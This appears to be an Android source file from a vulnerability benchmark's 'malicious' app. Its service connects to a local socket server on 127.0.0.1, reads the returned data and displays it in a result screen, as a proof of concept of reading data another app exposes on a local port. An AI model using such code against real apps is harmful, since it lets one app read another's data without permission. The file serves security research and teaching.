package edu.ksu.cs.malicious;

import android.app.IntentService;
import android.content.ComponentName;
import android.content.Intent;
import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;


public class MyIntentService extends IntentService {

    private static String TAG = "MalIntentService";
    private static String HOST = "127.0.0.1";

    public MyIntentService() {
        super("MyIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        final int PORT = Integer.parseInt(getResources().getString(R.string.local_server_port));
        Log.d(TAG, "In service");
        if (intent != null) {
            try (Socket s = new Socket()) {
                SocketAddress saddr = new InetSocketAddress(HOST, PORT);
                s.connect(saddr);
                if (s.isConnected()) {
                    Log.d(TAG, "Connected to " + HOST + " at port " + PORT);
                    InputStream is = s.getInputStream();
                    int data;
                    StringBuffer bf = new StringBuffer();
                    while ((data = is.read()) != -1) {
                        Log.d(TAG, "Result = " + (char) data);
                        bf.append((char) data);
                    }
                    Log.d(TAG, "Final Result = " + bf.toString());
                    result(bf.toString());
                } else {
                    Log.d(TAG, "Connected refused by " + HOST + "at port " + PORT);
                    result("Connection refused");
                }
            } catch (IOException e) {
                Log.e(TAG, "error while connecting to socket endpoint...", e);
                e.printStackTrace();
                throw new RuntimeException("error while connecting to socket endpoint...");
            }
        }
    }

    private void result(String r) {
        Intent i = new Intent();
        i.putExtra("Result", r);
        i.setComponent(new ComponentName("edu.ksu.cs.malicious", "edu.ksu.cs.malicious.Result"));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }
}
